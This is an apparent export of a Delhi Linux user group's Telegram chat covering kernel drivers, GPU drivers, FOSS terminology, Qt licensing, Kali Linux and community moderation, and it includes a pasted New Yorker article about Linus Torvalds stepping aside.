Kuntal,M,hellozee,"wow, another kernel dev in the group",1527396854
Vikas,Chauhan,iamchauhan,"That would be stretching it, but yea, I am kind a familiar with the network stack.",1527396890
AJ,,ajnsit,‚ÄúThe only expusure to emacs is the key bindings I have used for command line editing in bash‚Äù - you can use vi keybindings with ‚Äòset -o vi‚Äô,1527396907
AJ,,ajnsit,Another life changing setting üòÄ,1527396929
Vikas,Chauhan,iamchauhan,last looked at the kernel code was with ver 2.6 or something.,1527396936
Vikas,Chauhan,iamchauhan,Ive tried this  and I thought I would like it. but some how switching context is something that i try to avoid. say i dont have my sytem at hand but need to work on someone else's station. all my speed and optimization would be gone.,1527397016
Vikas,Chauhan,iamchauhan,I had also tried an extension for firefox that makes vi shortcuts work within the browser and you dont need to touch the mouse. but that was more for fun rather than efficiency. turned out okay for a while. until i switched back to the mouse because it feels more natural.,1527397086

Aditya,,adityamalla1990,yeah..,1527851590
Ayan,Pahwa,cli_ninja,You understand the protocol functioning?,1527851593
Ayan,Pahwa,cli_ninja,"i2C, SPI mainly can vary SoC to SoC",1527851628
Ayan,Pahwa,cli_ninja,Some has one others have two buses,1527851635
Ayan,Pahwa,cli_ninja,So you can cross compile and handle buses on device tree level,1527851656
Aditya,,adityamalla1990,alright.. but the basic development arch would be the same.,1527851665
Ayan,Pahwa,cli_ninja,Yeah,1527851679
Ayan,Pahwa,cli_ninja,Try writing a makefile for linux kernel i2c driver,1527851710
Aditya,,adityamalla1990,cross compiling linux for target hardware and developing these drivers on target system itself can also work right,1527851750
Ayan,Pahwa,cli_ninja,As kernel objects yes,1527851766
Aditya,,adityamalla1990,as the port addresses can be  easily located.. or else then you always have the data sheets,1527851780
Ayan,Pahwa,cli_ninja,But it is recommended to have a toll chain setup on native build host and build it alongside kernel,1527851794
Ayan,Pahwa,cli_ninja,To avoid fingerprints mismatch kind errors,1527851805

Aditya,,adityamalla1990,x86 and ARM both,1527851941
Aditya,,adityamalla1990,so what I plan to do is use the gpio ports of old x86 systems,1527851963
Aditya,,adityamalla1990,like Intel core 2 duo 2008 model..,1527851977
Ayan,Pahwa,cli_ninja,do they have i2c controller or you want to use gpios and make one by bit-banging?,1527852000
Aditya,,adityamalla1990,"and then configure GPIO ports into parallel, serial and then further SPI",1527852001
Aditya,,adityamalla1990,for SPI I will use TI 16658 controller..,1527852036
Ayan,Pahwa,cli_ninja,"I am curious , How are you planning to test it ?",1527852043
Aditya,,adityamalla1990,pretty much a retro stuff,1527852048
Ayan,Pahwa,cli_ninja,Do keep in mind threshold levels,1527852053
Ayan,Pahwa,cli_ninja,There might be different logic levels from cpu,1527852067

Ayan,Pahwa,cli_ninja,I cant recall any resources,1527852093
Ayan,Pahwa,cli_ninja,I started by learning functioning of these protocols,1527852103
Aditya,,adityamalla1990,as a concept... il try to interface another controller with it,1527852106
Ayan,Pahwa,cli_ninja,For i2c you need to assign address to that controller or in some cases it should have its own,1527852138
Aditya,,adityamalla1990,so you eventually developed these on those SCULL driver architecture..,1527852139
Aditya,,adityamalla1990,these*,1527852142
Aditya,,adityamalla1990,i2c.. more like later on...,1527852158
Aditya,,adityamalla1990,want to gwt into SPI first,1527852169
Ayan,Pahwa,cli_ninja,A good way to test is to use a logic analyzer,1527852172

Harsh,Spookdilya,MSFJarvis,Then you can't compare it with Github,1528019802

Harsh,Spookdilya,MSFJarvis,"Which is good, I shouldn't have to care for what goes behind the scenes.",1528020002
tchncs_bridge,,tchncs_bot,pavi: Harsh Shandilya (Telegram)   Every gitlab user has a preferences section for his/her profile where he/she can set all the color schemes they want. I use a dark one and I like it a lot.,1528020013

Dunken,Master,dunkenmaster,"Hello,

To all the community members.

As the organizers of PyCon India have confirmed that there will be community booths, so we can have one for ILUG-D too.

We could have ILUG-D t-shirts for members of the community that would manage the booth or for people in the community who are attending PyCon India to show the presence of ILUG-D and can even get ILUG-D's swag like stickers, badges, t-shirts or anything printed for distribution to the attendees as well as for the upcoming ILUG-D's birthday on 8-oct as we complete 2 years as a community.

Any further suggestions or help would be appreciated.

Regards,",1528359921

Kuntal,M,hellozee,I think you can restrict someone/everyone to add you to any group in Telegram,1528825277
cocoa,,cocoa1231,Nvidia GeForce GT 705,1528825278
cocoa,,cocoa1231,I used the Nvidia package normally,1528825285
Shashikanth Reddy,Palvatla,shashikanth171,Yes but it is not so by default,1528825294
cocoa,,cocoa1231,But that package stopped supporting my gpu,1528825298

cocoa,,cocoa1231,Dunno,1528825960

cocoa,,cocoa1231,"Could you switch between the two? Like, make the system ignore the GPU and use the CPU for graphics processing?",1528826085
cocoa,,cocoa1231,I think if you rmmod the nvidia and nouveau drivers it should fall back on the CPU for graphics processing,1528826119
Kuntal,M,hellozee,"In Laptop yes, in desktop umm I don't think so, you can just unplug your GPU",1528826125
Kuntal,M,hellozee,*that yes kinda depends how well your Distro supports nvidia optimus,1528826154

Manas,kashyap,reflect0r,How? To do that pls tell,1528826174
cocoa,,cocoa1231,I'm sure there's a kernel-level method to do this,1528826175

cocoa,,cocoa1231,Hm. Okay. I'll see how it works for desktops then,1528826339
Kuntal,M,hellozee,As far as I know this is only supported in Ubuntu,1528826341

Manas,kashyap,reflect0r,See something for AMD too pls @cocoa1231,1528826430
Kuntal,M,hellozee,amd already supports everything,1528826446
Kuntal,M,hellozee,I mean amd is better supported than nvidia in linux,1528826462
cocoa,,cocoa1231,Okay. I think you should be able to do it. What happens if you block the pci device associated with the gpu?,1528826462
Kuntal,M,hellozee,the vga/hdmi cable runs through your GPU probably,1528826496
Kuntal,M,hellozee,"if you block that pci port, your monitor goes blank",1528826541
cocoa,,cocoa1231,"There has to be a method to do it which doesn't rely on the GPU, but just the kernel",1528826647
cocoa,,cocoa1231,Imma keep looking,1528826652

Philomath,,miphilomath,"Oh, i think it goes deeper than that. Found about n loop antenna. Let me search more and then come back later",1529178449
Ayan,Pahwa,cli_ninja,"Not necessary, lambda/4 is when you want to do a quarter wave impedence matching which is prefered because of 4 stable harmonic wrt gnd plane. But it depends on lot of orher thing as well like type of antenna, coax diameter, centre frequency etc",1529178537
Ayan,Pahwa,cli_ninja,2.4Ghz wifi is not exactly 2.4 it has different channels so router antenna length is calculated from band centre frequency,1529178575
Philomath,,miphilomath,Any pointer on the specifics?,1529178770

Ayan,Pahwa,cli_ninja,You know what,1529178857
Ayan,Pahwa,cli_ninja,You can alter antenna length by changing capacitance and inductance on rf circuit as well üòÖ,1529178882

Ilugd-Bot,,ilugd_bot,Hello Cyber! Welcome to ILUG-D .Please introduce yourself.,1531074115

.,,rajudev,not in all cases.,1531074195
Kuntal,M,hellozee,"OSS -> The Source code  of the Software is available to all.
FOSS -> A subset of OSS where the software is both open source and free.
FLOSS -> A subset of FOSS where the source code of the program can be modified and can be distributed in your own terms.",1531074200
Kuntal,M,hellozee,This is what I have understood,1531074208

Kuntal,M,hellozee,Why can't be it?,1531074485
nightwarrior_xxx,,nightwarrior_xxx,FOSS was originated first then OSS came to existence,1531074526

Satyakam,Goswami,Satyaakam,Unfortunately Free the word has lots of meanings in the context of Free Software it has to be taken in the terms of Freedom,1531121904
Satyakam,Goswami,Satyaakam,Foss the term was coined to accomodate both the idealogies of Free software and Open source,1531121978
Satyakam,Goswami,Satyaakam,"not correct they are all the terms people came up with in order to explain to masses What Free and Open Source is all about , since the L in FLOSS means Libre it was dropped since not many folks understood its meaning too then the word Foss came into being",1531122255
Satyakam,Goswami,Satyaakam,Both of you are not correct üòä,1531122364
Satyakam,Goswami,Satyaakam,"No its about users freedom to share , copy and recreate read more about the four freedoms Free software has to offer in order to become Free Software",1531122465

Kuntal,M,hellozee,"Ahh, probably I somewhere read that many people still consider FLOSS different from FOSS",1531122925
nightwarrior_xxx,,nightwarrior_xxx,@Satyaakam Then what's the difference?,1531122999
Satyakam,Goswami,Satyaakam,Difference between ?,1531123058
Satyakam,Goswami,Satyaakam,afaik there is no difference except the Libre word,1531123105
Satyakam,Goswami,Satyaakam,I think this is a good read https://en.wikipedia.org/wiki/Alternative_terms_for_free_software,1531123224
Satyakam,Goswami,Satyaakam,Ask me anything if anyone has questions in the article we can explore together,1531123291
Guneet,,guneetnarula,"Terms may come and go, it's the values that matter",1531123316
Kuntal,M,hellozee,"What would you call Qt then? 
Essentially it is free and open source but without a commercial license you can't redistribute Qt under your own name, with your own patches. The Open Source license forces you make your patches for framework, available to the upstream.

I am quoting this from https://www1.qt.io/qt-licensing-terms/
Complete corresponding source code of the library used with the application or the device built using LGPL, including all modifications to the library, should be delivered with the application (or alternatively provide a written offer with instructions on how to get the source code). It should be noted that the complete corresponding source code has to be delivered even if the library has not been modified at all.",1531123823
Guneet,,guneetnarula,"It's FOSS for users who want to further develop FOSS applications. Similar to ""share alike"" under Creative Commons.",1531124057
Sahil,,warlord77,But they affect you when you build a commercial grade product and ignore them,1531124120
Guneet,,guneetnarula,You are referring to licensing then. Yes that matters a whole lot,1531124150
Kuntal,M,hellozee,"Following the licensing terms the next one,  it says: 

In case of dynamic linking, it is possible, but not mandatory, to keep application source code proprietary as long as it is ‚Äúwork that uses the library‚Äù ‚Äì typically achieved via dynamic linking of the library. In case of static linking of the library, the application itself may no longer be ‚Äúwork that uses the library‚Äù and thus become subject to LGPL. It is recommended to either link dynamically, or provide the application source code to the user under LGPL.

I am writing an application which uses Qt5.10 and above, which still not available for most of the distros, so can't distribute using distro based packages(.deb,.rpm). Upto now I was thinking of distributing it as an Appimage which is distro agnostic, but here comes the problem, appimages are statically linked and my project uses the zlib license, does that mean I should be using the Commercial license?",1531124190
Guneet,,guneetnarula,Interesting. What's the zlib license?,1531124336
Kuntal,M,hellozee,https://www.zlib.net/zlib_license.html,1531124389
Satyakam,Goswami,Satyaakam,"Licenses are like land mines unfortunately we need one in the FOSS world as well , get in touch with organizations like SFLC.in when in doubt",1531124455
Guneet,,guneetnarula,Was going to suggest sflc only.,1531124495
Kuntal,M,hellozee,Could we have a session or panel discussion from some of you on this topic in one of the upcoming meetups?,1531124528
Satyakam,Goswami,Satyaakam,"Sure we can have one again depends on the number of people who are interested , may be i can ask SFLC to host one meeting in there premises itself",1531124593
Guneet,,guneetnarula,"According to this, you can use zlib in your application, with a clear acknowledgement of zlib.h (Jean-loup Gailly and Mark Adler). You could have a third party software credits section",1531124606
Kuntal,M,hellozee,Thanks,1531124622
Guneet,,guneetnarula,"But when it comes to QT, i am not sure, haven't used it myself. If it is technically not possible to use their LGPL version then I guess you have no choice",1531124726

nightwarrior_xxx,,nightwarrior_xxx,@Satyaakam  @guneetnarula  Can you explain once again difference between FOSS and OSS?,1531134145
nightwarrior_xxx,,nightwarrior_xxx,Actually I am confused with them so I just want key points to make my concept clear about them,1531134200
Satyakam,Goswami,Satyaakam,"if you go by the terms FOSS is a neutral term where folks wants to mention about Free software as well , Free software apart from the software is a social movement ,OSS on the other hand took all the software from free software and the emphasis is more on the software development methodology",1531134934
Satyakam,Goswami,Satyaakam,in OSS we also pass on the Freedoms Free Software talks about but its not explicit in many ways,1531135018
Satyakam,Goswami,Satyaakam,the whole OSS word came into being because the business and normal folks were confused with the Free word,1531135065
Satyakam,Goswami,Satyaakam,again read this to understand the models https://en.wikipedia.org/wiki/The_Cathedral_and_the_Bazaar,1531135103
Satyakam,Goswami,Satyaakam,So bottom line when we mention FOSS we are acknowledging both the camps,1531135274

           Fix; attempt to correct a system with broken dependencies in place. This option,
           when used with install/remove, can omit any packages to permit APT to deduce a
           likely solution. If packages are specified, these have to completely correct the
           problem. The option is sometimes necessary when running APT for the first time;
           APT itself does not allow broken package dependencies to exist on a system. It is
           possible that a system's dependency structure can be so corrupt as to require
           manual intervention (which usually means using dpkg --remove to eliminate some of
           the offending packages). Use of this option together with -m may produce an error

Ayan,Pahwa,cli_ninja,@hellozee are we considering it ?,1532359929
Kuntal,M,hellozee,"Topic suggestion for Panel discussion:

PyDelhi had a very fruitful discussion with IDE vs editors where things lead to discussions about. `Code Quality`.

How about

 ""Collaboration in  open source/communities""

Talking points could be

  - Importance of code quality(doc-strings,  linters, pep8/Flake8 type Styleguides ).
  - Social skills and working in teams, how different projects manage this differently...
  - Using just zips and emailing code to each other vs Version Management git/svn...
  - Code of Conduct and Task lists for every one, how to make every one feel part of the community
  - CI/CD tests builds releases and deployments, Why, How(Buildbot vs Travis vs others).
  - Social tasks around communities, importance of volunteers who help design Posters, Social Media  posts,
  - People who volunteer to help in developer sprints and to teach and guide others.",1532359947

Raman,Tehlan,ramantehlan,"Before anyone judges, I will also like to tell my side of the story.
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
As we all know the mega meetup is coming, so I was excited and already created a poster for it, and to do so I was in touch with @rajataaron ,  I was busy collecting logos and stuff, with which @vipulgupta2048 was helping.

logo for Blockchain dev group was hard to find, so I was told that @Quanon can help me, but instead of sending me a logo, he simply sends me a screenshot, that too had a completely different background overlaid but I still accepted it and decided to edit it to make it better, but it was in bad quality, later I also discovered that It is used by other companies as there logo, so I thought to create a new one, and I posted it in the Blockchain group, with a message.

Then @Quanon asks me to use the screenshot only, so I informed him to provide me with a better quality of logo, to which he said, it is not his job, that it is my job, (It's not a job, I am volunteering), to which I shared a FOSS quote, to keep the conversation healthy. He then asks me to edit it and called me lazy. I created a new logo for the community, which wasn't copied from the internet, like the current one, and yet I was called lazy. I tried explaining to sir, that I Tried editing it, but the result was not good, and it is copied from the internet. But, he again calls me lazy. 

He then told me he created his logo, but I just proved that it is taken from the internet, after which all I know is, I was blocked from pydelhi, Blockchain Dev Group, and he personally blocked me too.


--------------------------

Members, I didn't break any guideline, I was so excited for the meetup, that I asked @vipulgupta2048 for more work for me, but yet, I was blocked without a trial, without any warning. An organizer is also volunteering to follow the guidelines and keep the order, but yet I was throw out as if it is @Quanon company. 

If the community feels that It is my fault, I myself will leave pydelhi, but I want the community to decide that, not just one person, but people.

Thank You for listening to my side.",1532364131

Rajat,Saini,rajataaron,"After reading conversation @ramantehlan you can say it in nice manner. The way of expressing of words on message is more difficult then talking. I have worked with @Quanon many times. 

Just want to clarify respecting others is all I know. @ramantehlan your intention was not wrong but way of expressing may be. So consider this as a warning and @Quanon please unban @ramantehlan from groups give him a chance to volunteer again. I will talk to @ramantehlan.",1532364626
Quanon,,Quanon,seems I should just let the community go where it wants to but I certainly felt the behavior could have been better,1532364640

Ayan,Pahwa,cli_ninja,"IMHO it is responsibility of community to provide their respective logos for posters which are suitable to use in posters, their might be misjudgements from messages but banning someone is never an option ... 

P.S he didn‚Äôt sounded lazy to me...",1532364799
Quanon,,Quanon,I did let you know how to do it in ink scape didn‚Äôt I,1532364814

Rajat,Saini,rajataaron,I understand but he is new to the community as you have more experience than us so i expect more mature behaviour than you atleast you can warn him about what he is doing.,1532364899

Raman,Tehlan,ramantehlan,"I don't lie, the best thing about community is, we can all agree to disagree, and yet work together.

I try to create the best thing for everyone, the only reason I asked for a better logo was the same.

I will do things systematically and will raise a PR for a new logo.

Xeon,Zolt,Xeon_Zolt,sorry little lazy to google,1532952768
Ayan,Pahwa,cli_ninja,IMO since all ntp clients are 32-bit compatible this issue will persist,1532953028
Ayan,Pahwa,cli_ninja,"I just checked with an engineer working on ntp here


even if you are using a 64-bit system the design flaw will still be there because the NTP protocol itself propagates time information with too small a time range as the time is relative.


My understanding is that one solution is to prevent the system time starting at 1970 (start of current UNIX Epoch) by setting system time to the build time.

I have not looked at your code snippet, so perhaps there is an additional issue there in the implementation. But anyway, NTP itself needs special treatment (or new NTP protocol design) to work across the boundary between UNIX Epochs.

Does that help ?

Dean",1532953173

So also with knives. and with tanks. 

The US on the other hand is a different culture. 3d printed gun would lower an entry barrier. But more pertinent is that there are no other strong barriers like cultural and legal. Hence it is drawing widespread attention. 

For that matter, a lot of harmful chemicals, some to be ingested (drugs) others pyro related ( bomb like) which can be easily made. The recipies are all over the net. But it has not been a huge problem as such because of cultural and other non digital aspects of the society.",1533085189

Srihari,Unnikrishnan,arcsaber,so much wrong in one sentence,1533731926
Srihari,Unnikrishnan,arcsaber,"-> Install Nvidia drivers
-> Kali",1533731942
Xeon,Zolt,Xeon_Zolt,what is wrong ?,1533732159
Srihari,Unnikrishnan,arcsaber,"a) he is using Kali 
b) He is installing Nvidia drivers",1533732187
Xeon,Zolt,Xeon_Zolt,"he requires kali, he has Nvidia GPU 
help me understand what is wrong with making things work (No disto shaming allowed)",1533732308
Srihari,Unnikrishnan,arcsaber,"well first of all, almost nothing goes the right way in Kali (as far as their own docs say ) Its not meant to be used in that way. plus almost any distro can have the features kali has. I find no point using it (sorry I had to shame)",1533732394
Srihari,Unnikrishnan,arcsaber,"given its unique nature, it is NOT a recommended distribution if you‚Äôre unfamiliar with Linux or are looking for a general-purpose Linux desktop distribution for development, web design, gaming, etc",1533732471
Kuntal,M,hellozee,"there are some reasons for using Kali though, sadly",1533732482

Kuntal,M,hellozee,For any pentester who doesn't want to carry a pc with him,1533732653
Kuntal,M,hellozee,"If someone is using Kali in first place he/she should know how to properly ask a question, failing to do will mean he/she is just starting to explore stuff, for which Kali is not recommended, hence either there should be a compelling reason to use Kali or he/she should use a more beginner freindly distro like Mint",1533732940
Ayan,Pahwa,cli_ninja,-1,1533733012
Kuntal,M,hellozee,why?,1533733028
Ayan,Pahwa,cli_ninja,There is no such thing as beginner friendly distro!,1533733031
Xeon,Zolt,Xeon_Zolt,do we have a beginner friendly distro with pen tools pre-installed cause a distro with default as root is not recommended for beginners,1533733074
Pradhvan,Bisht,Pradhvan,could you elaborate,1533733078
Ayan,Pahwa,cli_ninja,"If any beginner starts with ARCH (which you wont say is beginner friendly distro) and stay with it as daily driver, it may be hard initially but things will be sorted soon",1533733128
Kuntal,M,hellozee,How do you become a pentester without learning the shell?,1533733151
Ayan,Pahwa,cli_ninja,Everything boils down to use what works for you!,1533733152
Xeon,Zolt,Xeon_Zolt,its like using vim as daily driver when you start coding,1533733198
Kuntal,M,hellozee,You don't get the right to ask questions in such plain manner if you are using arch,1533733218

cocoa,,cocoa1231,Hey guys. We should make a public link for ILUGD too. Like @linuxchixin (t.me/linuxchixin) or @pydelhigroup (t.me/pydelhigroup),1533835492
cocoa,,cocoa1231,It's easier to share,1533835507
Kuntal,M,hellozee,easier and vulnerable,1533836189
cocoa,,cocoa1231,Essplain,1533836252
Kuntal,M,hellozee,tally the number of times linuxchix faced p*** spam,1533836278
Kuntal,M,hellozee,and number of times ilugd faced the same,1533836308
cocoa,,cocoa1231,Yeah but I think the growth of LCI versus the number of times it's been spammed (n:1) is worth it,1533836456
Kuntal,M,hellozee,sure? how do you measure growth?,1533836508
cocoa,,cocoa1231,"Number of people joined, messages per unit time, etc.",1533836523
cocoa,,cocoa1231,*non-spam messages per unit time,1533836542
Kuntal,M,hellozee,wrong features to calculate growth,1533836553
cocoa,,cocoa1231,Why,1533836562
Kuntal,M,hellozee,"messages can be on any random topic, if you carefully go through them, you will find noise is higher",1533836638
Kuntal,M,hellozee,"number of people joined, most of them rarely interact after the introduction",1533836701
cocoa,,cocoa1231,How would you measure growth?,1533836718
Kuntal,M,hellozee,"number of people actively participating in our meetups, I guess, and yes compared to the strengths of earlier meetups, linuxchix has grown a lot",1533836840
Kuntal,M,hellozee,number of issues in the talks repo,1533836870
Kuntal,M,hellozee,also gets counted,1533836878
cocoa,,cocoa1231,"With those parameters, LCI still has grown quite a lot",1533836977
Kuntal,M,hellozee,agreed,1533837032
Kuntal,M,hellozee,but that is not because making the group public but because of people like you who are devoting a chunk of their time to it,1533837075
cocoa,,cocoa1231,Fair enough. But I still do think that making a sharable link is better. You can put it up on a screen pretty easily. Imma put up a poll :P,1533837311

Hello everyone,
I'm new in Delhi, and a long time Linux user. I'm looking for some way to start contributing code to open source projects, but I have no idea where to begin. Hopefully I'll be at the meetup that's scheduled for September. And that's all there is to it. Looking forward to getting along with you guys üòä",1534500705

2. not able to turn off my bluetooth( not even after rebooting)

I was able to fix the second issue. To fix 1st issue, I tried 1st two solutions mentioned in this link: https://askubuntu.com/questions/117842/no-sound-from-speakers-but-headphones-work

1st answer mentioned here didn't work, and in trying out 2nd answer, my *alsa-base pulseaudio* got uninstalled, and not able to reinstall it now. Everytime, I try to re-install it, I get a dependency error to install *libpulse*. And, when trying to install libpulse, I'm again getting dependency errors and not able to find any way out to fix the issue.
I even tried running the commands again after doing: sudo apt-get update && sudo apt-get upgrade. But, it didn't work out and still getting same errors.

    - telegram hardly protects metadata (programs have been written in the past (this goes for WhatsApp as well by the way) which can monitor the off/online going of a user and are able to establish sleep patterns and such based on that data.

    - telegram uses the MTProto crypto protocol/algo. It's based on insecure standards for one but also; why in the living fuck would one write it's own crypto protocol when their are very secure (and actually verified) algo's out there? This makes no fucking sense. (also looking at you, Viber)

    Not a vulnerability or anything *technically* but you have to explicitly *start* an end to end encrypted chat session. That's perfectly fine of course but when you advertise your messenger as an 'encrypted' messenger and the chats aren't encrypted by default, that's very misleading.

cocoa,,cocoa1231,"Holy shit I missed a sh**show

My two cents on whatever just happened here:

1) For the person asking the question ( @vabhishek_me ), to form a concrete question, tell everyone what technologies for what purpose you're using. Try to be as to-the-point as possible. I would reframe your question like so:

Hey, I'm building an enterprise level API which will provide <insert functionality>, what tips do y'all recommend so that I can scale this service up as I get a larger userbase.

And then add some more details, which I didn't since I don't know much about what you're trying to make.

2) More importantly, to those who are answering the question (@hellozee @arcsaber), instead of changing the technologies they're using or critiquing what they're using, try to first answer what they've asked for. Everyone has opinions on what someone should use to do something, but if everyone just said that Hey, I think you should change your codebase from <something> to <something>, then there would be a thousand posts, none of them answering the OPs question. This happens quite a lot online.

If you do not know the answer, just start out by saying Hey, I'm not sure what the answer is, but I'm curious and then your question. In these situations, the person who's asked the question comes in hoping to get some recommendations or solutions, and goes out rethinking their life's decisions :P Not helpful to anyone.

P.S, this is mainly for new comers who don't know who's who. You can f*** with me or other people you know all you want :P",1536679890

nly,,muhfreedom,Free software is based on four essential freedoms. Richard stallman created the GNU project to protect user freedom in their computing.,1537029189
nly,,muhfreedom,Gnu acomplishes this by building free alternatives to propreitary programs. So that users are not dependent on companies like microsoft. They wrote many already existing programs again from scratch in order to liberate the users.,1537029295
nly,,muhfreedom,As a result we now have many different free software choices and it's almost possible to do everything without using proprietary software,1537029342

cocoa,,cocoa1231,"So @amarislit, my two cents:

- Everyone here (probably, including @arcsaber ) is aware of the GNU Philosophy, and we often use the word FOSS and Open Source interchangably here. So I feel like you can skip the part about explaining the GNU Philosophy.

- As far as I understand, @arcsaber's confusion comes from the fact that you said that users shouldn't have to rely on any developer at all for their software, but software has to be made by someone, and that someone, by definition, is a developer. So I think you should explain that part to him

And finally, let's keep the conversation polite and respectful toward each other :)",1537030479

After Years of Abusive E-mails, the Creator of Linux Steps Aside

By¬†Noam Cohen

September 19, 2018

Ôøº

After years of verbally abusing programmers who contribute to the Linux operating-system kernel he created, the celebrated coder Linus Torvalds is stepping aside and says he is getting help.

The¬†e-mails of the celebrated programmer Linus Torvalds land like thunderbolts from on high onto public lists, full of invective, insults, and demeaning language. ‚ÄúPlease just kill yourself now. The world will be a better place,‚Äù he wrote in¬†one. ‚ÄúGuys, this is not a dick-sucking contest,‚Äù he observed¬†in another. ‚ÄúSHUT THE FUCK UP!‚Äù he began¬†in a third.

Torvalds has publicly posted thousands of scathing messages targeting programmers who submit what he deems flawed code to the Linux computer-operating-system kernel, which he¬†brought to life¬†more than twenty-five years ago and now administers as a collaborative, open-source project. Today, the Linux kernel is famous, running the enormous computers of Google, PayPal, Amazon, and eBay, and the two billion mobile phones using the Android operating system. Torvalds, though, retains final say over each precious line of code, just as he did when he first started working on the system as a graduate student at the University of Helsinki. For years, he has been known as Linux‚Äôs ‚Äúbenevolent dictator for life.‚Äù

On Sunday, the benevolent dictator¬†announced¬†that he would be stepping down temporarily, to ‚Äúget some assistance on how to understand people‚Äôs emotions and respond appropriately.‚Äù Torvalds, who is forty-eight and lives with his family outside Portland, Oregon, made clear that he wasn‚Äôt burned out. ‚ÄúI very much¬†do¬†want to continue to do this project that I‚Äôve been working on for almost three decades,‚Äù he wrote in a post to the Linux-kernel mailing list. ‚ÄúI need to take a break to get help on how to behave differently and fix some issues in my tooling and workflow.‚Äù Torvalds named a deputy, Gregory Kroah-Hartman, to run the project while he was away.

Torvalds‚Äôs decision to step aside came after¬†The New Yorker¬†asked him a series of questions about his conduct for a story on complaints about his abusive behavior discouraging women from working as Linux-kernel programmers. In a response to¬†The New Yorker, Torvalds said, ‚ÄúI am very proud of the Linux code that I invented and the impact it has had on the world. I am not, however, always proud of my inability to communicate well with others‚Äîthis is a lifelong struggle for me. To anyone whose feelings I have hurt, I am deeply sorry.‚Äù

Torvalds‚Äôs response was conveyed by the Linux Foundation, which supports Linux and other open-source programming projects and paid Torvalds $1.6 million¬†in annual compensation as of 2016. The foundation said that it supported his decision and has encouraged women to participate but that it has little control over how Torvalds runs the coding process. ‚ÄúWe are able to have varying degrees of impact on these outcomes in newer projects,‚Äù the statement said. ‚ÄúOlder more established efforts like the Linux kernel are much more challenging to influence.‚Äù

¬†

Until this weekend, Torvalds had not only defended his aggressive behavior but insisted that it contributed to Linux‚Äôs runaway success. ‚ÄúIf you want me to ‚Äòact professional,‚Äô I can tell you that I‚Äôm not interested,‚Äù¬†he wrote in 2013, in response to a prominent Linux contributor, Sage Sharp, who demanded on a public e-mail list that Torvalds stop using ‚Äúphysical intimidation, verbal threats or verbal abuse‚Äù in his e-mails. ‚ÄúI‚Äôm sitting in my home office wearign [sic] a bathrobe,‚Äù Torvalds wrote. ‚ÄúThe same way I‚Äôm not going to start wearing ties, I‚Äôm¬†also¬†not going to buy into the fake politeness, the lying, the office politics and backstabbing, the passive aggressiveness, and the buzzwords. Because THAT is what ‚Äòacting professionally‚Äô results in: people resort to all kinds of really nasty things because they are forced to act out their normal urges in unnatural ways.‚Äù

Although",1537530837
Raghav,,Rwbhu,"it distributes its product for free, the Linux project has grown to resemble a blue-chip tech company. Nominally a volunteer enterprise, like Wikipedia, Linux, in fact, is primarily sustained by funds and programmers from the world‚Äôs large technology companies. Intel, Google, IBM, Samsung, and other companies assign programmers to help improve the code. Of the eighty thousand fixes and improvements to Linux made in the past year, more than ninety per cent were produced by paid programmers, the¬†foundation reported¬†in 2017; Intel employees alone were responsible for thirteen per cent of them. These same companies, and hundreds of others, covered the foundation‚Äôs¬†roughly fifty-million-dollar annual budget.

Linux‚Äôs √©lite developers, who are overwhelmingly male, tend to share their leader‚Äôs aggressive self-confidence. There are very few women among the most prolific contributors, though the foundation and researchers estimate that roughly ten per cent of all Linux coders are women. ‚ÄúEveryone in tech knows about it, but Linus gets a pass,‚Äù Megan Squire, a computer-science professor at Elon University, told me, referring to Torvalds‚Äôs abusive behavior. ‚ÄúHe‚Äôs built up this cult of personality, this cult of importance.‚Äù

For a research project, Squire used e-mails from Torvalds to train a computer to recognize insults. According to¬†Squire‚Äôs tabulations, more than a thousand of the twenty-one thousand e-mails Torvalds sent in a four-year period used the word ‚Äúcrap.‚Äù ‚ÄúSlut,‚Äù ‚Äúbitch,‚Äù and ‚Äúbastard‚Äù were employed much less frequently during that period. Squire told me that she found few examples of gender bias. ‚ÄúHe is an equal-opportunity abuser,‚Äù she said. Squire added, though, that for non-male programmers the hostility and public humiliation is more isolating. Over time, many women programmers leave the community. ‚ÄúWomen throw in the towel first,‚Äù she told me. ‚ÄúThey say, ‚ÄòWhy¬†do I need to put up with this?‚Äô ‚Äù

In 2013, Sharp, who is nonbinary and uses ‚Äúthey/them‚Äù pronouns, confronted Torvalds on his home turf‚Äîthe public Linux kernel mailing list. Sharp described Torvalds as ‚Äúone of the worst offenders when it comes to verbally abusing people and publicly tearing their emotions apart.‚Äù At the time, Sharp, who grew up in a small town in Oregon, was in their late twenties and was an important administrator of the Linux kernel. ‚ÄúPeople assumed I was a cis woman in tech, and I received a lot of harassment because of it,‚Äù Sharp told me. Sharp tried to appeal to Torvalds on practical grounds. ‚ÄúI‚Äôm not asking you to change your communication styles in order to help minorities. I‚Äôm not some crazy feminist ranting about cooties on Google+‚Äù Sharp wrote. ‚ÄúI‚Äôm trying to improve the kernel mailing lists for all developers. We can give negative technical feedback without verbal abuse.‚Äù

Torvalds replied that the stakes were too high to care about politeness. Faulty code can have cascading effects, requiring large amounts of work from other developers to correct. Speed and accuracy are paramount. ‚ÄúThe cursing happens for the ‚Äòyou‚Äôre so f*cking wrong that it‚Äôs not even worth trying to make logical arguments about it, because you have no possible excuse‚Äô case¬†.‚Äâ.‚Äâ.¬†and sometimes people surprise me and come back with a valid excuse after all. ‚ÄòMy whole family died in a tragic freak accident and my pony got cancer, and I was distracted.‚Äô And then I might even tell them I‚Äôm sorry. No. Not really.‚Äù

Valerie Aurora, a former Linux-kernel contributor, told me that a decade of working in the Linux community convinced her that she could not rise in its hierarchy as a woman. Aurora said that the concept of Torvalds and other powerful tech figures being ‚Äúequal-opportunity assholes‚Äù was false and sexist: when she and Sharp adopted Torvalds‚Äô aggressive communication style, they experienced retaliation. ‚ÄúBasically, Linus has created a model of leadership‚Äîwhich is being an asshole,‚Äù Aurora told me. ‚ÄúSage and I can tell you that being an asshole was not available to us. If we were an asshole, we got smacked for it, got punished, got held back. I tried it.‚Äù

Auro",1537530837
